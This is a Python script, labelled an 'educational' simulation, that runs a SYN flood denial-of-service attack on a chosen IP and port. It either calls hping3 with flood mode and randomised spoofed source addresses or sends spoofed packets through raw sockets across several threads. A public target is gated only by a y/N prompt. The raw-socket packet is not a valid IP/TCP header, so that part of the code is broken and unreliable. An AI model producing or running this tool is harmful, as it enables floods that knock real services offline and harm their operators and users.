import os
import sys
import random
import time
import socket
import argparse
import subprocess
from threading import Thread

def ensure_root():
    """Verify if the script is executed with root privileges."""
    if os.geteuid() != 0:
        print("[!] Root access required. Run with sudo.")
        sys.exit(1)

def validate_ip(ip_addr):
    """Confirm IP format and restrict to private ranges."""
    try:
        socket.inet_aton(ip_addr)
    except socket.error:
        print(f"[!] Invalid IP address: {ip_addr}")
        sys.exit(1)
    
    if not ip_addr.startswith(('10.', '172.', '192.168.')):
        proceed = input(f"[!] {ip_addr} seems public. Continue? (y/N): ")
        if proceed.lower() != 'y':
            sys.exit(1)

def detect_tool(preferred):
    """Check if required external tools exist."""
    if preferred == 'hping3':
        if subprocess.run(['which', 'hping3'], capture_output=True).returncode != 0:
            print("[!] hping3 missing. Switching to raw mode.")
            return 'raw'
    return preferred

def raw_syn_attack(target, port, duration, rate):
    """Conduct a SYN flood attack using raw sockets."""
    print(f"[*] Engaging raw SYN flood on {target}:{port} for {duration}s at {rate}pps.")
    
    def craft_packet(dst_ip, dst_port):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            
            src_ip = f"{random.randint(1, 223)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
            src_port = random.randint(1024, 65535)
            
            packet = struct.pack('!4s4sHH', socket.inet_aton(src_ip), socket.inet_aton(dst_ip), src_port, dst_port)
            s.sendto(packet, (dst_ip, 0))
            s.close()
            return True
        except Exception as e:
            print(f"[!] Packet send error: {e}")
            return False
    
    import struct
    start = time.time()
    sent = 0
    threads = []
    
    def sender():
        while time.time() - start < duration:
            if craft_packet(target, port):
                nonlocal sent
                sent += 1
            time.sleep(1 / rate)
    
    for _ in range(min(10, rate // 100 + 1)):
        t = Thread(target=sender, daemon=True)
        threads.append(t)
        t.start()
    
    try:
        for t in threads:
            t.join()
    except KeyboardInterrupt:
        print("\n[!] Attack interrupted.")
    
    print(f"[*] Attack complete. Sent {sent} packets.")

def hping3_attack(target, port, duration, rate):
    """Execute SYN flood using hping3."""
    print(f"[*] Launching hping3 flood on {target}:{port} for {duration}s.")
    cmd = ["hping3", "-S", "--flood", "-p", str(port), "--rand-source", target]
    start = time.time()
    process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    
    try:
        while time.time() - start < duration:
            time.sleep(1)
        process.terminate()
    except KeyboardInterrupt:
        process.terminate()
    
    print("[*] Attack ended.")

def main():
    parser = argparse.ArgumentParser(description='Educational SYN flood simulation tool')
    parser.add_argument('-t', '--target', required=True, help='Target IP')
    parser.add_argument('-p', '--port', type=int, default=80, help='Target port')
    parser.add_argument('-d', '--duration', type=int, default=60, help='Duration in seconds')
    parser.add_argument('-r', '--rate', type=int, default=100, help='Packets per second')
    parser.add_argument('-m', '--method', choices=['hping3', 'raw'], default='hping3', help='Flooding method')
    args = parser.parse_args()
    
    ensure_root()
    validate_ip(args.target)
    method = detect_tool(args.method)
    
    if method == 'raw':
        raw_syn_attack(args.target, args.port, args.duration, args.rate)
    else:
        hping3_attack(args.target, args.port, args.duration, args.rate)

if __name__ == "__main__":
    main()
